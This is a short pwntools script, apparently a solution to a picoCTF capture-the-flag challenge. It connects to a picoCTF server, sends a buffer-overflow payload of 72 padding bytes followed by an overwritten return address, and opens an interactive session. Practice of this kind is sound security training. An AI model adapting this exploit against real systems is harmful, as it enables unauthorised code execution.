from pwn import *

io = remote('saturn.picoctf.net',65088)

payload = b"A"*72 + p64(0x000000000040123b)

io.sendlineafter(':',payload)


io.interactive()
